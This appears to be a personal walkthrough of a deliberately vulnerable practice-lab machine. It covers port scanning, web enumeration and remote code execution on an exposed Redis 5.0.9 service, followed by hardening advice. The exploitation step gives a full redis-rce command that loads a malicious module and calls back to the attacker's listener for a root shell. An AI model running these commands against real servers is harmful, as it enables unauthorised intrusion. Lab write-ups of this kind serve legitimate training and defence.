## Introduction

In this walkthrough, I explored an intentionally vulnerable PG Practice machine and identified several open ports: 22 (SSH), 80 (HTTP), 8080 (alternate HTTP), and 6379 (Redis). Upon enumerating the Redis service, I discovered it was running version 5.0.9. I searched for publicly available vulnerabilities for this version and found  remote code execution (RCE) exploits targeting 4.x and 5.x versions of Redis. Using the exploit, I was able to successfully gain root access on the target machine.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open 
```

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

## Services

### Port 22

We usually skip SSH.

### Port 6379

Version - Redis key-value store 5.0.9

[Redis Pentesting Best Practices](https://secybr.com/posts/redis-pentesting-best-practices/)

Neither worked, but we can upload `.so` module to the target if we have that possibility. I am gonna write this to Loot.

## Web

### Port 80

![image.png](image%204.png)

```bash
searchsploit nginx 1.10
```

**No result.**

```bash
gobuster dir -u http://$IP/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 42
```

**No result.**

### Port 8080

- **robots.txt**
    
    | http-robots.txt: 3 disallowed entries
    |_/admin/ /reset/ /compose
    
- **Gobuster**

    - **ping**
        
        Tried command injection  but it didn’t work
        
        ```bash
        sudo tcpdump -i tun0 icmp
        ```

    - **api**
        
        Nothing interesting
        
    
    ---
    
    - **uploads**
        
        **Nothing**
        
    
    I couldn’t find default credentials and nothing after registering.
    

## Loot

- NodeBB version
- Gobuster scan
- Upload module redis

## Exploitation

Actually I found this vulnerability long before analyzing port 8080 I just couldn’t make it because lport that was default was blocked. So I changed it to another one

[https://github.com/Ridter/redis-rce](https://github.com/Ridter/redis-rce)

```bash
python3 redis-rce.py -r 192.168.114.69 -L 192.168.45.155 --lport 80 -f ../RedisModules-ExecuteCommand/module.so
```

Now we received a shell as root!

## Mitigation

- **Update Redis:** Always keep Redis up-to-date. Vulnerabilities like this RCE are patched in later versions.
- **Access Control:** Bind Redis to `127.0.0.1` or use a firewall to restrict access only to trusted IP addresses.
- **Authentication:** Enable Redis password authentication with a strong, complex password using the `requirepass` directive.
- **Disable Dangerous Commands:** Use the `rename-command` feature to disable or obfuscate dangerous commands like `CONFIG`, `MODULE`, or `SLAVEOF`.
- **Run as Non-root:** Ensure Redis does not run as the root user. It should run under a dedicated, unprivileged user.
- **File Permissions:** Limit write permissions to Redis configuration and data directories to prevent unauthorized manipulation.
